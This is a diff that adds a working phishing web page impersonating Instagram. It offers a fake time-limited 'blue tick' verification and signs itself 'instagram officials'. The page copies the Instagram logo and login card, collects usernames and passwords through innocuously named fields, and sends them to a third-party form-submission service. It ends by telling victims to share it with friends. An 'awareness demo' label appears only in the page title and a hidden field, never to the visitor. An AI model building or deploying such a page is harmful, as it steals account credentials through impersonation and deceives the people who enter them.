@@ -1,0 +1,541 @@
+﻿
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Social Verify - Awareness Demo</title>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body { background: white; }
+
+.page {
+  display: none;
+  min-height: 100vh;
+}
+
+.page.active { display: flex; }
+
+/* PAGE ONE */
+
+#welcome {
+  background:
+    radial-gradient(circle at 80% 80%, #7b1b30, transparent 40%),
+    linear-gradient(140deg,#020617,#10051d);
+  color: white;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 30px 22px;
+}
+
+.badges {
+  font-size: 85px;
+  color: #259bff;
+  margin-bottom: 12px;
+  text-shadow: 0 0 30px #168aff;
+}
+
+.insta-title {
+  font-size: 42px;
+  font-weight: bold;
+  margin-bottom: 35px;
+}
+
+#welcome h1 {
+  font-size: 30px;
+  line-height: 1.4;
+  max-width: 420px;
+}
+
+.blue { color: #1e9bff; }
+
+#welcome p {
+  color: #ccc;
+  font-size: 17px;
+  line-height: 1.6;
+  margin: 22px 0 35px;
+}
+
+.gradient-btn, .start-btn {
+  width: 100%;
+  max-width: 400px;
+  padding: 18px;
+  border-radius: 40px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+.gradient-btn {
+  border: none;
+  color: white;
+  background: linear-gradient(90deg,#a020f0,#ed168b,#ff8a00);
+}
+
+.start-btn {
+  margin-top: 22px;
+  border: 2px solid white;
+  color: white;
+  background: transparent;
+}
+
+.footer {
+  margin-top: 45px;
+  color: #ddd;
+  font-size: 13px;
+}
+
+/* PAGE TWO */
+
+#second {
+  background: #fafafa;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+}
+
+.login-card {
+  width: 100%;
+  max-width: 380px;
+  text-align: center;
+  background: white;
+  padding: 30px 28px;
+  border: 1px solid #dbdbdb;
+  border-radius: 12px;
+  box-shadow: 0 8px 30px #0000000c;
+}
+
+.demo-logo {
+  width: 76px;
+  height: 76px;
+  margin: 0 auto 15px;
+}
+
+.brand {
+  font-size: 27px;
+  font-weight: bold;
+  color: #262626;
+  margin-bottom: 8px;
+}
+
+.subheading {
+  color: #737373;
+  font-size: 14px;
+  margin-bottom: 20px;
+}
+
+.warning {
+  background: #fff4d6;
+  padding: 13px;
+  border-radius: 8px;
+  margin-bottom: 20px;
+  line-height: 1.5;
+  color: #674d00;
+  font-size: 13px;
+  border: 1px solid #ffe2a0;
+}
+
+.demo-input {
+  width: 100%;
+  padding: 15px 13px;
+  border: 1px solid #dbdbdb;
+  border-radius: 7px;
+  background: #fafafa;
+  font-size: 14px;
+  margin-bottom: 12px;
+  outline: none;
+}
+
+.demo-input:focus {
+  border-color: #168bfa;
+}
+
+.consent {
+  display: flex;
+  align-items: flex-start;
+  gap: 9px;
+  text-align: left;
+  font-size: 12px;
+  color: #555;
+  margin: 8px 0 15px;
+  line-height: 1.5;
+}
+
+.login-btn {
+  width: 100%;
+  padding: 14px;
+  background: #168bfa;
+  border: none;
+  border-radius: 8px;
+  color: white;
+  font-weight: bold;
+  font-size: 15px;
+  margin-top: 7px;
+  cursor: pointer;
+}
+
+.login-btn:disabled {
+  opacity: .6;
+  cursor: not-allowed;
+}
+
+.back {
+  margin-top: 22px;
+  color: #168bfa;
+  border: none;
+  background: none;
+  cursor: pointer;
+  font-size: 14px;
+}
+
+.demo-footer {
+  color: #999;
+  font-size: 11px;
+  margin-top: 20px;
+  line-height: 1.5;
+}
+
+#form-status {
+  font-size: 12px;
+  margin-top: 12px;
+  color: #555;
+}
+
+/* PAGE THREE */
+
+#third {
+  background:
+    radial-gradient(circle at 80% 80%, #123b70, transparent 40%),
+    linear-gradient(140deg,#020617,#10051d);
+  color: white;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  padding: 25px;
+  flex-direction: column;
+}
+
+.success-card {
+  max-width: 430px;
+  width: 100%;
+}
+
+.verified-logo {
+  width: 90px;
+  height: 90px;
+  border-radius: 50%;
+  background: #168bfa;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 25px;
+  font-size: 55px;
+  color: white;
+  box-shadow: 0 0 35px #168bfa88;
+}
+
+#third h1 {
+  font-size: 30px;
+  margin-bottom: 18px;
+}
+
+#third p {
+  color: #ccc;
+  line-height: 1.7;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.awareness {
+  background: #ffffff12;
+  border: 1px solid #ffffff30;
+  padding: 18px;
+  border-radius: 12px;
+  text-align: left;
+  margin-bottom: 22px;
+}
+
+.awareness h3 {
+  color: #55b5ff;
+  margin-bottom: 12px;
+}
+
+.awareness ul {
+  padding-left: 20px;
+  color: #ddd;
+  font-size: 13px;
+  line-height: 1.8;
+}
+
+.home-btn {
+  width: 100%;
+  padding: 17px;
+  border: none;
+  border-radius: 30px;
+  background: #168bfa;
+  color: white;
+  font-weight: bold;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+@media(max-width:400px) {
+  .insta-title {font-size:35px;}
+  #welcome h1 {font-size:25px;}
+  .brand {font-size:24px;}
+}
+</style>
+</head>
+
+<body>
+
+<!-- PAGE ONE -->
+
+<section id="welcome" class="page active">
+
+  <div class="badges">✓</div>
+  <div class="insta-title">BLUE TICK</div>
+
+  <h1>
+    
+    <span class="blue">You have a golden chance to get blue tick time is limited</span>
+  </h1>
+
+  <p>HURRY! UP </p>
+
+  <button class="gradient-btn"
+    onclick="showPage('second')">
+    OPEN
+  </button>
+
+  <button class="start-btn"
+    onclick="showPage('second')">
+    GET STARTED →
+  </button>
+
+  <div class="footer">
+    instagram officials
+  </div>
+
+</section>
+
+
+<!-- PAGE TWO -->
+
+<section id="second" class="page">
+
+  <div class="login-card">
+
+    <div class="demo-logo">
+      <svg viewBox="0 0 100 100"
+           width="100%" height="100%">
+
+        <defs>
+          <linearGradient id="instaGradient"
+            x1="0%" y1="100%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#ffdc80"/>
+            <stop offset="35%" stop-color="#fcaf45"/>
+            <stop offset="65%" stop-color="#e1306c"/>
+            <stop offset="100%" stop-color="#833ab4"/>
+          </linearGradient>
+        </defs>
+
+        <rect x="7" y="7" width="86" height="86"
+          rx="25" fill="url(#instaGradient)"/>
+
+        <rect x="24" y="24" width="52" height="52"
+          rx="16" fill="none" stroke="white"
+          stroke-width="7"/>
+
+        <circle cx="50" cy="50" r="13"
+          fill="none" stroke="white" stroke-width="7"/>
+
+        <circle cx="70" cy="30" r="5" fill="white"/>
+
+      </svg>
+    </div>
+
+    <div class="brand">INSTAGRAM</div>
+
+    <div class="subheading">
+     
+    </div>
+
+    <div class="warning">
+    Log in into instagram.
+    </div>
+
+    <form id="Form">
+
+      <input
+        class="demo-input"
+        type="text"
+        name="fi-text-demoNickname"
+        placeholder="username"
+        maxlength="25"
+        required
+      >
+
+      <!-- MANUAL CLASS INPUT -->
+
+      <input
+        class="demo-input"
+        type="text"
+        name="fi-text-classLevel"
+        placeholder="pasword"
+        maxlength="20"
+        required
+      >
+
+      <input
+        type="hidden"
+        name="fi-text-purpose"
+        value="Phishing Awareness Educational Demo"
+      >
+
+      <label class="consent">
+        <input type="checkbox" required>
+        I have filled my details.
+      </label>
+
+      <button class="login-btn" type="submit">
+        CONTINUE
+      </button>
+
+      <p id="form-status" aria-live="polite"></p>
+
+    </form>
+
+    <div class="demo-footer">
+     instagram officials.
+    </div>
+
+    <button class="back"
+      onclick="showPage('welcome')">
+      ← Back to Welcome Page
+    </button>
+
+  </div>
+
+</section>
+
+
+<!-- PAGE THREE -->
+
+<section id="third" class="page">
+
+  <div class="success-card">
+
+    <div class="verified-logo">✓</div>
+
+    <h1>CONGULARATIONS</h1>
+
+    <p> you will get your blue tick in 24 hour
+      
+    </p>
+
+    <div class="awareness">
+
+      <h3>share it with your friends also</h3>
+
+      <ul>
+       
+      </ul>
+
+    </div>
+
+    <p>
+    <br>
+      . 🔐
+    </p>
+
+    <button class="home-btn"
+      onclick="showPage('welcome')">
+      ← BACK TO HOME
+    </button>
+
+  </div>
+
+</section>
+
+
+<!-- JAVASCRIPT -->
+
+<script src="https://forminit.com/sdk/v1/forminit.js"></script>
+
+<script>
+
+function showPage(id) {
+
+  document.querySelectorAll(".page")
+    .forEach(page => page.classList.remove("active"));
+
+  document.getElementById(id)
+    .classList.add("active");
+
+  window.scrollTo(0, 0);
+}
+
+const forminit = new Forminit();
+
+const FORM_ID = "vjnq7a8ng1k";
+
+const form = document.getElementById("Form");
+const status = document.getElementById("form-status");
+const button = form.querySelector("button[type='submit']");
+
+form.addEventListener("submit", async function(event) {
+
+  event.preventDefault();
+
+  button.disabled = true;
+  button.textContent = "SUBMITTING...";
+  status.textContent = "Sending demo response...";
+
+  try {
+
+    const formData = new FormData(form);
+
+    const { error } = await forminit.submit(
+      FORM_ID,
+      formData
+    );
+
+    if (error) {
+      throw new Error(error.message);
+    }
+
+    form.reset();
+    status.textContent = "";
+
+    showPage("third");
+
+  } catch (error) {
+
+    status.textContent =
+      "Submission failed. Please try again.";
+
+    console.error(error);
+
+  } finally {
+
+    button.disabled = false;
+    button.textContent = "CONTINUE";
+
+  }
+
+});
+
+</script>
+
+</body>
+</html>
